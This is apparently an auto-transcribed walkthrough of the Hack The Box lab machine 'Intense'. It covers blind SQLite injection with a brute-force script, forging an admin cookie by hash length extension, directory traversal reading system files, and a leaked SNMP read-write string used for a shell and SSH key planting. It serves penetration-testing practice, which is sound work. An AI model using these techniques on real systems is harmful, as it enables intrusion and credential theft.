 what's going on youtube this is ipsec can be doing intense from hack the box which was an extremely challenging machine which is surprising when you combine it with the fact that there's really no surprises that author didn't try to hide anything from you pretty much every step along the way they provide you the source code for you to analyze and figure out how to do it it starts off with a web application that has two vulnerabilities the first one is a sql injection and a sql lite database but the way it's coded makes sql map not really work and even when you try to manually exploit it it has some difficulties because of limited character space and then once you do a sql injection you'll have difficulties actually trying to crack the hash because it's not crackable it's vulnerable to a hash extension attack which lets you trim off a piece of the secret at the beginning of a signed message if it's signed improperly and just let you resign the message it's a really cool attack i don't fully understand it but we'll do it and after all that you get access to the admin of the webpage that lets you read files and list contents of a directory you get a private snmp string that allows you read write privilege that lets you get code execution get a shell on the box and then find out there's a buffer overflow for the root so with all that being said let's just jump in as always we're going to start with the add map so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it intense and then the ip address which is 10 10 10 195 and i am going to run nmap with sudo because it always runs better with sudo i explained in some other videos but just take my word for it and run sudo with your nmap if you're not root looking at the results we have two ports open the first one being ssh on port 22 and this tells us it's an ubuntu server we also have http on port 80 and it's also telling us it's ubuntu and we also have nginx which doesn't really mean all that much but i generally don't see too many php web apps on nginx for some reason normally that is just going to be apache that being said i'm pretty sure hack the box is on nginx so take that with a grain of salt just something to keep in mind now this box is unique that it does have something listening on udp that becomes important later on you don't have to do udp scans all the time and i'll show you how i found out this box had udp listening once we get to that point but if you're super diligent about your scans you could do a dash su for udp we can add dash v and then do 10 10 10 195 and uh this does require root privilege and i don't like scanning udp that much because nmap is kind of flaky telling us what ports is open and what is not um if you wanted to you could add oa and map udp and we'll just let that run and come back to it so it had a website running so 10 10 10 195 and we just get this intense web app um we could try like slash index.php to see if it is a php app and it isn't i don't know exactly what it is i think it was python but we'll find out in a second um click on home we don't have anything it says you can log in with username and password of guest so i'm gonna try guest guest if i can type guess that is and it says you are logged forgot to say logged in but we get in here and the only thing new is this submit form so i'm to submit the form test and we say your message has been sent and it brings us back here um i'm going to switch over to burp suite and we're going to intercept this message and see what we have so on my proxy tab intercept is on we're going to say uh please subscribe send this message go over to boop sweet and send this to repeater and we just get the message okay so the very first thing i do whenever i have an endpoint that is authenticated which means um this submit page i needed to be authenticated to hit it or at least see it um i don't even know if i have to be authenticated to hit it we can test it out real quick so i'm going to change this request method to be a get we're not going to send anything and we're just going to say what was it slash message i think is this slash submit so we get the submit form with this where it says like send feedback message so looking at the bytes it's four two eight eight hit it a few times the bytes doesn't change i'm going to get rid of the cookie 4166 and it's gonna probably say wait what is different when i send the cookie and not does it say like logged in as guest or something now i'm actually curious let's um see this but what i'm getting at is whenever you have authenticated endpoints and an api or a website you should try just hitting them without being authenticated to see if um you actually need to be authenticated sometimes you'll see that the authentication just gives you the link so let us refresh this page oh burp sweet is off turn it on refresh the page get rid of the cookie and see what this says send feedback there must be something in like the source code that says guest or something but not gonna spend too much time on it looks like you don't need to be authenticated to hit this only see the link so that's pretty cool um it's gonna come in handy when we try to fuzz this endpoint because we can get okay here and then taking that out we also get okay so we don't have to send our login cookie with our fuzzing so we could manually fuzz this and figure out what it is such as just putting a single quote makes it error we can do a single quote and comment and complete input so chances are this is going to be some type of sql however the way i like buzzing it is just using a tool called fuff and now i'm using fluff because um hack the box has a course on it i used to use w fuzz for all the things but now i switched over to fuff and we'll show why if you go to the hack the box academy it's a tier zero module so if you just go to modules all modules tier zero and you can sign up for the do i click to zero tier zero attacking web applications with both so you can sign up for this course for free and go over it and learn all about the tool that being said we're just going to do it manually so i'm going to run you http 10 10 10 195 submit message and this is the end point i want to hit and then i'm going to use the word list opt set list buzzing special characters so that's going to go through this whole word list i'm going to tell fluff that i want to do a post request i don't know if i have to since i'm specifying data as well just something i want to do then dash d this is going to be the data portion so this portion of the message right here so i'm just going to say message is equal to a and then fuzz and whenever it sees fuzz in all capitals just like w fuzz it's going to replace everything in this word list with fuzz and then the next thing we should do is i think that may be it we can run this and let's see did that work i'm expecting to have to do something with the content header um we didn't get anything so everything says size 200 size two words one or status 200 and when we were mainly poking at it we put a single quote and we got a different size and more words if we look at the single quote here it still says size two words one lines one so whenever you do something like any type of fuzzing you should be able to find a way to identify that you're actually buzzing correctly and it's not just giving you something so let's send this over to burp suite so i'm going to do a dash x and we will say http colon slash 12701 colon 8080 and we can clear the proxy cache go in and i'm going to forward the request until actually we can for them all and then just go in http history and find the one with a single quote which is right here and go to the response and it says okay so i'm going to make this sent to repeater and we can look at these two requests and this one with a single quote i'm going to copy paste it here to make sure this is the same exact thing and it's saying okay and not here so at this point i look at all these headers and going back to this there's not many it doesn't have a content type header so let's go and add that to tell the application what type of content it is and like we're going to say application url form encoded which is this there's also like json which would turn this into a json message so json would be something like um message colon i wonder if that's gonna work that would be kind of like a json says okay huh that actually works if we do a single quote with a okay doesn't i could be doing that piece wrong but the key piece oh wait i did not change this to be json okay okay that doesn't work uh you don't test yourself always just try writing like json and everything by hand on the fly you'll find out you'll make mistakes just like me and maybe the application doesn't even support that so um i'm not gonna spend too much time playing with that but the key thing is we just add this header so i do the dash capital h flag and we can say content dash type specify x application form encoded and now when we send this we do have one thing so with uh it changes how you do these filters a little bit so we can do f h and we can see it's got a match and a filter filters essentially hide matches match so we can do um filter let's see response size fs so if we run this again we can do dash fs1 or probably fs2 to hide size two and we do that and we only get one request back right here the single clip uh if we did match size two we get everything back so yeah so we have a single quote causing some weird things so at this point we probably should throw this into sql map because it's a sql injection makes sense to turn into sql map so i'm going to copy request to file and i'm going to say dot request and we can do sql map dash r message dash request dash dash batch uh level five risk three and this is just going to take a while to run in the background and we can go and mainly poke at this sql injection and yes i know if we went to the actual website um it says this app is open source and there's a link to download the source code which we'll do in a bit but i always like um doing as much blind as i can so i can figure out how to enumerate applications that i just don't have the source to so again we do a single quote and we get this error message so the main thing i'm curious about is like why when we do a comment we get incomplete input because this should um end our injection so that is unique um we could try like and this to see if we can do anything so what i did was i turned the statement into um something a and we put the ending quote there and a and then the system puts something here and does something afterwards so we know we can do this so we can enumerate what type of database it is an unrecognized token i know is a sqlite error message but we could try like and db name or something this is a mysql function and we get no such function so we know this is not mysql and based upon all the error message we're getting um we know it's equal light like if you had googled unrecognized token i think sqlite's gonna be the very first thing so let's do uh database and paste this just to see what we get and yeah sqlite so that's just a way to identify um what database you're in so the next piece of this is to try to extract data and it doesn't look like we get any output back like if we do a valid query it just says okay so there's nothing for us to do a union injection into so that leaves boolean injection so we can try to do some type of boolean injection so let's um try a case statement that supports um if then so we can do and case when and i'm putting everything in caps when um it's sql light syntax type thing yeah i don't think it's case sensitive so when one equals one then one else two and and then we have to do a this should be this and else and a is equal to a so we have this and if we change this query uh right now they're both um going to accept so you have to change one of these to be an error message and we can do else maybe db name let's see it's always going to error when we do this because this function doesn't exist so we have to do a function in sql lite that we just don't have permission to do which we could do load extension so now this is a 100 valid sql like query and on this else we get we're not authorized to do load extension so now we have a good way to do boolean injection so let's go back over to our sql map and we see it's still taking its way time so let's quit this and try to speed it up so let's say the parameter is going to be message so dash p and we say inject into this we can say dash dash technique is equal to b which is boolean i think it's b e a u s t for all the techniques um we want b um dash dash dbms is equal to sqlite and when we run this it's not gonna find it at all and i don't know exactly why the case is where sql map doesn't find it and it's taking forever uh did i do it correct i don't think it would take this long but oh because i have level five still so i have these so it's still taking a sweet time i think sequel lights just not great at i mean sql maps just not great at doing sql light so i'm going to show the one really bizarre thing i saw that i thought it would detect boolean injection so we can say what is it dash dash proxy is equal to http colon slash localhost 8080 and we go over to her proxy we can see sqlite's requests and we can see some here from sqlite changing the size or changing the length and if we look at the response we get syntax errors so i would think it would know to go more into some type of boolean injection but maybe because it's syntax error and not saying invalid it didn't work um sql map also has a dashed h which will give you advanced help i think it's dash dash string will match when the query is evaluated true so we can also try adding that dash dash string to be ok to help sql map know exactly what a true statement is on that boolean and then finally what we could do is help sql map even more and go into our repeater copy this and let's go into what we call it message.request we can change this and whenever you put a start in the request that's telling sql map where to inject so we can inject into this right where the boolean is and let's see instead of dash p message we'll just get rid of it and it tries to inject right there um let's do the dash dash proxies to show you exactly that's what's happening host 8080 there we go go over to burp suite go to the proxy history oh we're getting message too long now so maybe that's why so there is something after 140 characters that it will say message too long so maybe that's breaking sql map but i just want to show all the playing around with sql map trying to get it working and it never works so that's why we go this manual route i'll be really curious to read all the write-ups to see if anyone got sql map working but we can do um statements here so if the statement is true it's going to work if we do 1 equals 1 you get okay if we do 2 equals 1 you get not authorized so we can try select count username from users where username like and i'm just going to put a wildcard here and we're going to close this and we have to do a another one and we'll say greater than zero we get okay i'm gonna put please subscribe here and hopefully we get an error message we get oh message too long oh uh please there we go not authorized so what we did here was let me copy this into a terminal so we can kind of break this down and make it more readable so the we'll just call it help so what we did we have this and then this turns it into a case when and then we got this select count username and when that is greater than zero then this is going to say ok else load extension end so the reason why we did count is if we just did username here um we'd have to try to brute force the entire username i think or no um we'd have to put the username in this piece and we're going to do that when we go and try to break this password but the count is just saying hey um show me like it's either going to be 0 1 or i guess it could be like four if you did like probably um or username like this it's probably gonna be like three users or two users so we can play with this a little more but this is gonna return how many users there are and as long as there's one user it's going to say okay so that's what i'm trying to explain there so let's see let's do this percent so we can do greater than one says okay greater than two uh says not authorized we do equals two though it says okay so we know there's two users um one is probably going to be guessed so i'm going to hit g percent and we get not authorized because there's only one user that begins with g so we can just do equals 1 or greater than 0. so g u e s t sweet we got the very first user um we put something after this is not authorized but the next one we can begin with a and as soon as we do this you can probably guess what the user would be and the user is going to be admin and we can do an i to see if it's administrator it's not so it's just admin so from this sql injection we know the first user on this is admin so let's try extracting his hash i'm not used to that actually ask me a question this will be user like when i hit this it's like what do you want a websocket http that's new and sweet but control r this one's going to be password so there's a few ways we can do the password i'm going to explain it the first way how we're going to do it in the script and then we'll show a way you could potentially optimize how you're scripting it if you want a real challenge to go fast but when you do the brute force it's going to be this way so here again we can do queries so we can say select what is it actually let's clear this and rewrite it so i'm going to go like this there we go so let's just write the query here and then we'll go back so it's select and we're going to guess secret from users and i got this piece from analyzing the source code and we're going to do that when the time comes but um yeah so select secret from users limit 0 1 and that's going to grab the very first user we could do where username like or is whatever but whenever i do this type of stuff i always like doing it in numbers because we said where a user is then it's gonna be harder to script to enumerate everything if we did it with this limit statement we just have to increment this number by one and we move to the next entry and uh the result so it just makes it more script friendly so that's why i like doing it that way so we're gonna do like that and we'll have to say like like that yeah so this is going to grab the secret from users the very first user which is probably going to be admin it could be guest but generally the very first user in a database is always admin and like just like how we did the username so let's put this all on one line and we have a syntax error there we go i had too many parentheses so we could brute force this and see if we get it uh d e f so now we know this does work so i'm going to change it up and show you how you can do some little optimization but we're not going to do this in the script because it would probably take add another like 15-20 minutes the video to do it but we can say um substring this ah what is it i'm just going to retype the whole query because it's a pain to edit queries so we can say unicode substring select secret from users limit 0 1 and now we're getting out of this and we can say uh one one i think this is it so what this piece is doing right here is it's going to extract the very first character of the secret and then what this piece is doing is it's going to convert that into a unicode character so that's going to allow us to like do greater than less than so if we have like the very first character can be 1 through 100 instead of sending a web request one two three four we could send a web request like is this greater than 50 okay it's greater than 50. is this greater than 75 okay it's not so now within two requests we took that 100 character key space and turned it down to just 25. so hopefully that makes sense um put these here i think i put a extra semicolons uh parentheses somewhere like that and i don't know if it has let's see it's less than do we have a number here zero let's see i have an error message somewhere uh it probably only needs one parenthesis there we go so we're saying not authorized if we do is greater than zero it says okay we know the very first one was f based upon the previous thing we did so i'm going to do man ascii and we can look for f and the unicode value for f is 102. so i bet if i do greater than 100 it's still going to say okay if i say greater than oh wait that's zero there 100 there we go change it to 200 not authorized so we could go okay now is it greater than 110 nope so it's between 100 and 110 and then you could have the logic of your script go is it 100 no is it 101 no is it 102 yes okay we know the very first character is f so that is the way to do it optimized um of course we're not gonna do optimize because that's gonna be a huge pain in the butt script so i'm just gonna do it this way so let's copy this request and we're going to go into python and create a thing to get a password so i'm going to do git pw dot pi and let's see the first thing we do is import the request module because we're definitely going to want that and then let's create a function called check result and we're going to have guess so this is going to return true if the application says okay essentially so payload is equal to f and we'll paste this and right here this is going to be the guess okay it's just weird how my line wrapping is there's not a blank line there but anyways so we have that is the payload then we have to put the headers so headers is equal to content type then application url encoded and we did this because we learned from f if we don't have this header it's always going to say okay and then the data is going to be message is equal to payload and the reason why i kind of just didn't do um the payload with data like there's no reason i couldn't have done like uh data equals here and been done with it it's mainly just like i like having paler and it's separate thing in case i want to do any type of um editing or massaging the data so we have that and then we can actually make a request so r is equal to request dot post http 10 10 10 195 submit message data is equal to data headers is equal to headers and the one thing i notice i'm missing is after guess we need a percent this is the wild card okay that looks good and we can say if okay in our dot text close the quote and it's dot text then return zero else return one we could go return true return false if that's easier to read so now we can say check or if check result oh we might just say print print check result uh we'll say f hey see what happens here python 3 get pw of course i use python 2 syntax for my print i don't know what i was thinking there it's been forever since i even touched python 2. we get true both times so we definitely screwed something up so let's see um we can print payload i'm guessing it's probably uh within the headers if i had to guess so case one select secret this looks good so i'm guessing i have screwed this up and put a typo somewhere like right there and we have it fixed so now we have a way to brute force a single character at least so let's make the function now um we'll call it brute and the very first thing we're going to do is set pw equal to nothing i always like to set pw to pass but that's an actual variable or a function so we can't could be password but that's a pain to type every time so that's why i do pw um the care set i'm going to assume this is a hash so we're only going to go up to f and then all the characters so if we do um four care and care set print care and we had called brute price on three is going to loop through that character set which is awesome so we can do four um we can say if check result care print care break let's see i don't know why that did not print a b c d e f that's weird for karen karasat check result let's do else oh we're not running it i was like that's also going very fast we killed the brute function so we get the very first character um i'm going to do something for style this is all just personal preference but import the sys module and instead of printing i'm going to do cis standard out dot write f backslash r pw i let's see we can also do that and then cis stdl dot flush to flush out so now all that did if i typed it correctly uh let's see cis oh i just i don't know what i did there we go hi it's not defined of course it's not we called it care see you may not be able to see it now because it's going fast but it should loop through and just print everything it's doing so you'll see when um it actually works uh let's see yeah maybe we do this up here there we go but let's just wait until um we go get rid of the flush this is gonna print all the characters now um we'll come back to that uh the next thing we have to do is go through and go to the next character so i'm going to do something really messy and i'm going to infinite loop this and on this checked result we're going to increment password or add to the password variable so pw equals care so every time it gets a valid hit it's going to add the next one and i think we need to actually do that flush so let's do cis sdl flush and oh wait that was not that uh care it's actually going to be um pw plus care so i was just going after and trying to brute force the very first character of the password every time because we weren't using this pw variable so now we get yeah we should do flush because it's messing up how it's printing so you can see how that looked and if you do sys standard out dot flush after each one it's just going to clean up the output let's get rid of this first print i have no clue because we do the password increment there so i don't think we have to actually flush yeah there we go so we can see it now actually getting the hash um i was trying to get it so it would actually uh show each attempt it's doing but i did not do that well let's see i wonder if i do up here before the check we can do sys standard out write password plus care like that there we go so now we have it actually writing as it goes so we just wait for this to finish and we will have the hash so i'm gonna speed up the video until this starts looping and it's important to know that um this script won't terminate itself it's up to us to terminate it so you'll see that in just a second so here we go it's already cracked everything and we see this is just um continually looping so i'm going to ctrl c and we're going to copy that hat oh i think it do not think it like that um let's see because i don't think that's long enough uh echo dash n wc-c 32 is that 32 characters um i'm just gonna run it to make sure and then uh yeah so so that last a is actually not something so it's this copy there we go we got the hash i don't know why it wasn't let me copy it before but we finally got it um echo n wc-c 31 so i think there's probably something else to this hash that we had screwed up so i'm going to go back here and let's get the password i'm going to say like and put the hash and we get not authorized put a percent at the end we get okay so we did miss something and it's not an a so our script did something wrong i don't know what it did yet but we're going to find out what it was missing and then try to fix it 0 1 two three four really what am i missing oh it's fd fd percent so i'm just going to send it to intruder because this is the more optimal way to do it and we will clear that put one here go to payloads and then do we have like hex here a to z three letter words uh h oh i did too many oh well there we go so now we have that we can start this attack and probably based upon the length i would think maybe not um i swear we're missing one character because 31 wouldn't make sense see is this response always not authorized it is a b c d e f and we send that to repeater so maybe it is only 31 characters oh wait a second one so we're hitting a um character thing message too long so that's why it's not displaying the very last character um i don't think we need a space between that then so we can do two parentheses there there we go so that's it we actually hit 140 characters exactly at 31. so uh we had to shorten up our payload by getting rid of that white space that is that is annoying uh let's see i hope that's the whole hash we may have to do it a dif we may have to break it up into sub strings because maybe we can't put this whole hash here so let's get rid of that space start attack and it's still not authorized for everything what does a request look like fd and f so fd um let's see so the issue is this is probably going to be longer than 32 characters my assumption with doing all these um intruder modules has been it's going to be a md5 sum so when i was doing the intruder my request doesn't have a percent at the end so it's not like this because it goes into extra characters so we probably have to do a sub string because we're hitting the maximum number of characters so let's see um we know it's f1 so i'm just going to be v note f1 and we're going to do a substring so let's try um let's see i think substring goes on the outer so substring select zero one like that and then the first character which i think is one one i think this is right um is like f uh select syntax so we definitely screwed that up um let's see in case when substring select secret see if we get rid of this like f okay what if i can do a substring here substring secret and then one one okay we do two one not authorized so this is where we can do it the third character is clear character f oh uh second character should be one so one is f two should be a i think a one there we go so this is the new query we want so let's copy this and let's see we're going to make a backup of or get password script because we're making tons of changes so payload is equal to f like that okay and let's see guess this will be position and this will be where's that f this is guess still there we go so now we have to keep track of the position so let's see pos is equal to zero for care and care set we're going to do pos plus equals one and then check result we're only going to give it the care we'll do position and character there's no way this works first try but we'll check it out oh zero um what that's definitely not what it should be 0c02 and then it ends let's see password position character so let's print pos print care and i think the easiest thing would be do is send this to burp suite because i have no idea why it's behaving like this let's see let's uncomment comment those out and before i send to burp i just want to print the payload to see what it looks like oh no that's not it oh shoot um we're incrementing the position every time uh we do a character so that's a mistake uh the increment should only be when we detect a valid hit so pos plus equals one there we go so if you looked every single request was incrementing the position uh shouldn't do that it should be whenever it gets a hit so as soon as it hits f we should have got the position to increment let's see can go back and look at this i don't know why it keeps putting in a at the end let's see abcdef so this is where we should of incremented so in case substring oh we begin at one substring begins at one there we go so as soon as we hit the f it should increment there we go so finally have it i think let's see right there we go so it looks like it's working now and this way um a payload doesn't actually get increased when we're um guessing so we should never hit this 140 character limit so i'm going to speed up the video and we're going to wait till the hash is complete so it looks like it is done and we have a long hash right here so let's copy this and we will the hash paste it in wc-c 65 characters which is probably going to be 64 to line break echo-n um wc-c yep 64. so that is the hash what this is um we can't really use this at this point i tried to go into hash cat and crack this hash but um it's not crackable so i'm gonna save the time of that probably save five ten minutes off the video and we'll just pretend we cracked it with hash cat and it didn't work at this point it's definitely when you need to find this source.zip on the website so we can download it and start poking at the source so let's move source.zip into a directory and unzip it and we go into the source i'm just going to run codium which is a visual studio code and we can poke around at the source to see what the vulnerability here is so the very first thing we look at is the submit we can see on submit it's a method post submit message submit is a get submit message is post here's where it say if characters is greater than 140 and we also have the injection querydb insert into messages values this and message and message is got gathered right here so request form get message and we're checking the length here check those bad words in the string so we can look at where bad words is we have to look at that function but it's not doing anything other than that and then passing it straight to this insert so that's where the vulnerability is so from utils import this so we can look at it and we just can't use ran system exact date and our injection which we didn't do anyways so yeah um that is the injection piece so the next thing in applications is generally look at how like login sessions are handled so it's probably gonna be what's lwt stand for um i think this is what we want i can't remember what it stands for top my head it is using sha-256 so and maybe like lesser jwt because if you look at the actual cookie um we made a point of getting rid of the cookie on every request so let's go to one of our very first requests to this app here do we have her cookie so if you look at how this cookie works um see the cookie this is what it is we can get rid of all because that's just the name of it jwt tokens are normally three base64 blobs this is just two we got a blob right here and a blob right here so let's take a look at what that very first blob is so we can do cat cookie uh awk dash f period print one and then base64 dash d and we can see the cookie's username guest secret like this so let's look at the second field what that is and it looks like it's just a blob so looks like it's just a hash and this is probably going to be a let's see uh dash c we'll just do 100 and wc see this 64 characters so this is just a shot hash so if it was jwt you'd have a blob before the data that just explains it's a jwt like type jwt hashing algorithm whatever so we're missing that so this is a homegrown type crypter thing and we can see how it's being signed so it's returned sha 256 secret plus message and the secret every time the application starts up it's doing a os dot u random so it's just grabbing random bytes uranum is the secure way to do it and going from 8 to 15 in length so this is a huge key space to brute force so we probably can't just try cracking it because um theoretically the password would be 8 to 15 yep 8 to 15 bytes of data and then this so can't really crack that we can look at how or but there can't really crack it however it is vulnerable to a hash length extension because in hash length extension attacks it's complete magic how it works to me i fully don't understand it but if you have this secret you can generate new sha sums if you just start truncating and getting rid of this piece so because the secret is before the message we can do this attack if the secret was after the message we couldn't start removing the message because we can't really control the end we can only control the beginning is a good way to think about it or how i think about it so if you google it around for like hash length extension attacks um you'll probably get a better explanation of me because i still don't know how they work you kind of just continue doing the hashing algorithm if you remove this piece so so instead of blubbering let's just do it um i'm going to use a tool called hash pumpy or python module called it and um well hash pump is the c program but hash pump b is the python program i think so if you do pip install pumpy i think it should install uh maybe pip three let's do python three so it's already installed for me so let's um v hash extend dot pi and what we're going to want to do is pretty much the same modules so we'll import request import hash pumpy and we'll see if we need anything else so the first thing we need is the cookie so we can say hash is equal to and it's going to be a byte object so let's do um let's see do i have an invert let's go to proxy there's whatever i did my awk thing but i don't know what that was so we'll just grab it like this so we can do echo dash n base64 dash d i'm gonna grab this so copy paste and then the next thing we need or that's not the hash this is the um cookie we'll say guest cookie and then guest hash is equal to b and then the other piece of this so we can grab this this is what it's used to sign the cookie so echo dash n base64-d xxd dash p c a hundred and put this in here okay and we're gonna want to create an admin hash or admin cookie and it's going to extend the um the cookie so i'm putting a semicolon at the beginning just because if we look at how this purse is it splits by um semicolon so that's why i did that here admin and then the secret is gonna be the hash let's see this if we brute forced the guest account we'd get this hash um the hash is the password hash so if we go up one oh whoops uh we had it here b get pw if we change this to limit one one instead of zero one it's gonna get the second user and you'll see it gets eight four probably eight four nine whatever so that's now getting the um that hash so what we need is a test cookie module so we can do def test cookie and give it the cookie and then cookies is equal to auth cookie and then r is equal to request dot get http 10 10 10 195 slash admin if we look at here we have this route admin at the very top it says if is not asmin request abort 403 so there is no remember the very beginning of the video we talked about something on submit message there's nothing here that is doing a permission check so that's why we could hit it but we want to get to slash admin and then cookies is equal to cookies i think that's all we have to do and if our dot status code does not equal 403 because if we try to make a request to admin it's going to give us a 403 error so let's see do i have anything i don't care about we can just go to proxy on this git submit and change it to get admin and we get 43 forbidden so if that return true else return false so there's test cookie and now we have to do the hash pump attack so we can say for i n range 8 and 15. and this is the uh bytes that secret could be so if we went back to lwt um secret is somewhere between 8 and 15 bytes so that's why we're doing this and we can say um it's the next thing we can get rid of that give ourselves a little more space so let's do hash pumpy dot hash pump did i do it correct pumpy dot pump i should probably be doing this in visual studio where it gives me everything um it wants the guest hash first this piece then it wants the guest session so or guest cookie so we give it these two pieces and that wants us to give it the pieces we want to forge so we'll do admin cookie and then i and i is going to be again 8 9 15. that's going to be the length of the secret we're trying to extend away from so let's see does this even work cookie line nine uh let's see cookies we need to do auth cookie like that else forgot a quote a colon so let's see does not look like it worked um let's see print we print this out what happens okay so it returns two things it returns the signing key or the new shah hash and then the new cookie that it extended so we can say new sign new cookie is equal to that and then we just have to encode them so we can say import base64 or wait um from b64 import base64 encode i think is it we'll see again probably should be doing it in visual studio or something or ide it's actually not base64 encode it's b64 encode muscle memory comes in super handy so b64 encode new sign and we'll do b64 cookie is equal to b64 encode new cookie so let's print these to make sure they're good 64 cookie from base 64. i kind of like got those two things reversed uh bytes like object is acquired not string so let's see maybe it's dot in code here did hash pumpy give us strings uh where is the error deprecated line 19 b64 sign i put the end card at the wrong spot so right here bytes like object has no attribute in code what one of those was probably encoded there we go so uh this was a string this was a byte object already so we got it working so now we just have two base64 blobs so now we can just reassemble the cookie so we can say cookie is equal to underscore cookie plus and we'll do plus b64 sign and we'll print cookie and we're almost done if we did this correctly so now we got a few cookies hopefully these aren't all the same yeah they look slightly different so now let's test it um if test cookie cookie print cookie uh first bite must be a tuple oh come on maybe dot decode and we didn't get anything so we did something incorrectly so everything returned with an error i'm going to print the cookie here and we're going to see what the cookie looks like and it looks fine actually the signature looks a bit big um what's the signature before where is burp suite uh here this signature is like half the length uh echo dash n paste this wc-c that's 44 and this signature echo dash n wc-c 88 so um what's happening is how we're doing the hashing so you remember when we went with the valid signature and did echo dash n base64-d and we just got a bunch of junk and that's when we did like xxd to turn it into hex well in python we basically forward a string not each hex byte so if we do echo n base 64-d we just get characters this should be in bytes so we shouldn't be able to display this that's what mistake i just made so we can change this where it's b64 sign we don't need that encode there we can do a bytes dot from hex to convert this into hex and let's see python3 hash extend probably get rid of printing every cookie and let's pray we only get one cookie there we go we just got one right here so let's try going back to a burp suite repeater uh go here we don't have permission we can do uh cookies auth is equal to that don't have permission but maybe i did the cookie wrong yeah it's cookie not cookies and a header so now we can see the admin panel so we can go up to firefox and go back to our page and try to hit slash admin and we get the forbidden but we can go tools web developer i'm just going to do web console because i know storage is right there and we can replace the cookie with our cookie uh make sure i replace the whole thing okay with our cookie refresh and we get welcome admin so we are now an admin on this application we can go back into our um codium and we have two functions now we have admin log view and admin log dur the post modules so let's go back here i'm going to do view i'm going to change these to post so admin view der and change this to post admin wait did i do it backwards no doors there so admin log view log view and this is blogder and it's saying the argument here is logder this is logfile so we can do logder is equal to slash and we can see all the files and slash we can do here which is log file etsy passwd uh was it log file wait what admin log view admin log view log file maybe we have to do dot slashes there we go so it's a directory reversal too so looking at this there is something unique the very first tint there was snmp on the box this debian snmp and let's go back over to our pane we can see nmap reported snmp was open but the first hint of snmp is obviously debian dash snmp being here and the other thing i always like doing with um directory traversals is going into slash proc so proc sketch debug is a file that has a bunch of processes running on the box and we can probably find snmp somewhere so i'm just going to search for service so that's vm tools let's go to the next one engine x app we have a bunch here a note server so this is a application we don't know what it is we may be able to get the um configuration file for that and see exactly what that is and we got app service so these two services we don't know there's probably an snmp one but i'm gonna make notes real quick uh app.service and the other one was something with a note a note server.service so we got two things there um snmpd we have processes here running snmp we go up is there snmp service i think it may be right here yep smpd service so again that sketch debug file is big and you also have uh proc net tcp this is going to show every port that's listening so this is in hex so all zeros this is going to be any host 50 and hex if we go over to python python 3 print 0x50 is 80. um 35 this is localhost only so 127 is that 7f 0001 uh maybe i'm wrong there i think that's localhost uh 35 what is that is that 53 yeah 53. um so localhost 53 for dns 16. this is going to be 22 that's ssh uh yeah i don't know what this one is uh this is 127.001 so 127.001 this is 127.00 uh 35 so which is 53 so on 127.0053 dns is listening weird thing um i don't know 12701 1389 don't know what this is uh port 5001. so we got something listening on port 5001 and then 50 we already said this was http if you go over to udp you have a few things listing on udp so 12701 on dns or 100 53 on port 53 then you got this a1 a1 is uh 161 and then i don't know what ddf6 is 56 822 so that's how you enumerate kind of what's listing on the box um put 5001 is definitely interesting if we go back to the notes uh nodeserver.service maybe that's 5001 potentially so let's enumerate more let's see what's in our current directory so this logged her period and we have a few files app.ini database dot db admin dot pi app.sock we could try like app.ini to get the file so we can try app.ini maybe dot slash we have to get into the directory i think uh zlogder let's see so it's doing admin list log so let's see if these directories are different in utils admin list log is going into logs let's just try dot dot slash app.ini there we go so that's the configuration i just got this because i didn't know if there was a password or something in the configuration so right here we kind of got to enumerate exactly what is on this box so let's try going into the home directory maybe there's like an ssh key we can get so let's go to slash home or log dur a bunch of dot dot slashes there's a home user a few files in here so user.txt there is this note server.c so we may want to grab this so let's go to view and we can do note server.c and looks like there's a program so i'm going to save this let's go back oh we can turn i guess pretty off i was trying to make it pretty the note server.c paste it and we'll keep going um we may want to see if we can find like an ssh key so what i'm going to try to do is ssh keys can only be readable by their current user so let's see what user we are um proc self and bayern self cmd line does this work internal server error um environ oh i'm on directory uh copy this go to view paste and we are let's see what user we are laying bin we are web user equals web so we can go back to etsy passwd to see where our home directory is it looks like it's just in slash so we can check if there is a slash dot ssh and it doesn't look like there is let's just make sure there's no directory so since there's no ssh directory we can't get in um the only thing that's really sticking out is the snmp stuff so let's try etsy snmp that directory snmpd let's do etsy oh i always forget this directory traversal snmp and we have a snmp.com and snmpd.com let's take a look at snmpd.com so do i have it there let's do etsy snmp and we have some information and there is a read write community of super priv com 90. and whenever you have read write on snmp you can do some pretty bad things for instance on cisco devices you can edit where the tftp backup is and then tell the device to perform a backup so you edit the tftp backup to be your ip address tell the device to backup and it sends you its backup file in this box though um snp read write can actually get you a shell um let's see if we can find the blog post on this real quick snmp read write debian shell exploit is it here um maybe this purse um i'm not gonna go too in depth and all the like snmp set command and everything because it is super specific on like doing spaces and things like that instead um we're just going to try snmp shell so when you have a snmp read write string you can always just try snmp shell to see if it actually gets code execution i know it's not normally like the ipsec way to not explain but this box is a beast especially for a hard machine so we can install this so it wants us to install these things um there we go and then we do a git clone and go in and then do a pip install so it's installing all the mibs and if we did a snmp walk v2c dash c public i think 10 10 10 195. let's see we'd probably see some stuff that indicates it is vulnerable maybe not so let's see did that command finish okay we have now installed it so we can do the next thing which is a git clone go into snmp shell and we will install so it's installing all the requirements for this and we can try um how we do it so it says snmp shell or like this so rlwrap i'm going to specify python3 10 10 10 195 dash c and paste the community string which is probably enter burp suite and see if this gets a shell we do id we have a shell so pwd um cd home so we can cat etsy pass wd and we can go into ver lib snmp uh we can't get a shell here but we can write a dot ssh directory so one already exists and let's see we can add a key to this so ssh dash key gen dash f uh intense cat intense dot pub let's copy this and let's see echo dash n probably shouldn't do like vi or nano and anything on this type of shell because it's not a reverse shell um cat authorized did i put it in i should run two dashes echo dash n authorized keys see lsla off okay we can write into it maybe it doesn't like the directors we are doing um touch tea cat tea echo this so this is i guess too big we can only go up to 255 characters and that is probably going to be a lot of characters so we can do echo dash n wc-c 544 characters so way too big um there's probably a different algorithm we can use with ssh key gen so let's try easy dsa do we have to specify anything um block size let's do like that uh we probably have to do dash f intense overwrite the key and let's see cat intense dot pub that is much shorter so let's do um echo dash n wc-c 140. so this will probably fit in 255 characters let's try this we could have broken up in multiple chunks but i want to see if this works authorized keys did not fit okay so let's try this authorized keys we need echo dash n cat authorized keys so let's see let's try echo dash n paste to t so we wrote that i think yeah okay it's just weird how it kept um displaying i guess it's just this shell so we can do echo dash n and then paste a little more 2t echo dash n paste yet a little more um let's remember let's go to the nerd server exit uh let's see what's h-a-y okay grab here paste a little more to t echo dash n and there's a firewall on this box that i'm just didn't enumerate because i know because i did this box a while ago so that's why we didn't go and just try a curl um trying to speed up the video a little bit for these super hard machines of not trying things that are super basic so if we 